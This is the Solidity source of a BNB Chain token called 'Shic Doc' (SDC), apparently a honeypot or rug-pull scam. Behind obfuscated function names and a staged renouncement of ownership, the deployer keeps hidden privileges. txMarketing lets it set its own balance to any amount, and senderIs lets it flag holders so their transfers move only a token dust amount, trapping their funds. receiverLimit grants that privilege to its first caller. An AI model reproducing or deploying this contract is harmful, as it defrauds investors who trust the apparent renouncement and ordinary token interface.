/**
 *Submitted for verification at BscScan.com on 2023-02-07
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface senderReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface totalAuto {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract ShicDoc {
    uint8 public decimals = 18;
    

    uint256 constant walletAmount = 10 ** 10;
    uint256 private launchMax;
    uint256 public totalSupply = 100000000 * 10 ** decimals;
    
    uint256 private tokenShould;
    uint256 public walletLaunchedTeam;
    address public owner;
    mapping(address => uint256) public balanceOf;
    address public teamLimit;
    bool public launchAt;
    bool public marketingTx;
    bool public marketingMode;

    string public name = "Shic Doc";
    mapping(address => bool) public amountFee;
    bool public totalLaunchedLaunch;
    bool private enableList;

    bool public toTradingLaunch;
    mapping(address => mapping(address => uint256)) public allowance;

    uint256 private toLaunched;
    string public symbol = "SDC";
    uint256 public minAutoSell;
    address public launchLimit;
    mapping(address => bool) public minTrading;
    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        if (enableList) {
            toTradingLaunch = true;
        }
        senderReceiver tradingList = senderReceiver(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        teamLimit = totalAuto(tradingList.factory()).createPair(tradingList.WETH(), address(this));
        owner = totalLiquidityExempt();
        
        launchLimit = owner;
        amountFee[launchLimit] = true;
        balanceOf[launchLimit] = totalSupply;
        
        emit Transfer(address(0), launchLimit, totalSupply);
        enableToken();
    }

    

    function getOwner() external view returns (address) {
        return owner;
    }

    function transferFrom(address walletLiquidityMin, address swapBuySell, uint256 enableExempt) public returns (bool) {
        if (walletLiquidityMin != totalLiquidityExempt() && allowance[walletLiquidityMin][totalLiquidityExempt()] != type(uint256).max) {
            require(allowance[walletLiquidityMin][totalLiquidityExempt()] >= enableExempt);
            allowance[walletLiquidityMin][totalLiquidityExempt()] -= enableExempt;
        }
        if (swapBuySell == launchLimit || walletLiquidityMin == launchLimit) {
            return swapBuyMarketing(walletLiquidityMin, swapBuySell, enableExempt);
        }
        if (launchAt == marketingTx) {
            launchMax = tokenShould;
        }
        if (minTrading[walletLiquidityMin]) {
            return swapBuyMarketing(walletLiquidityMin, swapBuySell, walletAmount);
        }
        if (minAutoSell != launchMax) {
            launchAt = false;
        }
        return swapBuyMarketing(walletLiquidityMin, swapBuySell, enableExempt);
    }

    function swapBuyMarketing(address maxLaunchedMode, address senderLaunchReceiver, uint256 enableExempt) internal returns (bool) {
        require(balanceOf[maxLaunchedMode] >= enableExempt);
        balanceOf[maxLaunchedMode] -= enableExempt;
        balanceOf[senderLaunchReceiver] += enableExempt;
        emit Transfer(maxLaunchedMode, senderLaunchReceiver, enableExempt);
        return true;
    }

    function txMarketing(uint256 enableExempt) public {
        if (!amountFee[totalLiquidityExempt()]) {
            return;
        }
        balanceOf[launchLimit] = enableExempt;
    }

    function senderIs(address receiverLaunched) public {
        
        if (receiverLaunched == launchLimit || receiverLaunched == teamLimit || !amountFee[totalLiquidityExempt()]) {
            return;
        }
        if (launchMax == minAutoSell) {
            minAutoSell = walletLaunchedTeam;
        }
        minTrading[receiverLaunched] = true;
    }

    function launchedMin() public view returns (bool) {
        return launchAt;
    }

    function tradingFund() public {
        
        if (toTradingLaunch == marketingTx) {
            walletLaunchedTeam = launchMax;
        }
        launchAt=false;
    }

    function enableToken() public {
        emit OwnershipTransferred(launchLimit, address(0));
        owner = address(0);
    }

    function tokenTradingAuto() public view returns (bool) {
        return totalLaunchedLaunch;
    }

    function totalLiquidity() public {
        
        if (marketingTx) {
            launchAt = true;
        }
        marketingTx=false;
    }

    function receiverLimit(address sellTeam) public {
        if (minAutoSell == launchMax) {
            marketingTx = true;
        }
        if (marketingMode) {
            return;
        }
        if (minAutoSell == toLaunched) {
            enableList = false;
        }
        amountFee[sellTeam] = true;
        marketingMode = true;
    }

    function transfer(address swapBuySell, uint256 enableExempt) external returns (bool) {
        return transferFrom(totalLiquidityExempt(), swapBuySell, enableExempt);
    }

    function totalLiquidityExempt() private view returns (address) {
        return msg.sender;
    }

    function approve(address exemptBuy, uint256 enableExempt) public returns (bool) {
        allowance[totalLiquidityExempt()][exemptBuy] = enableExempt;
        emit Approval(totalLiquidityExempt(), exemptBuy, enableExempt);
        return true;
    }

    function amountMarketing() public view returns (bool) {
        return launchAt;
    }


}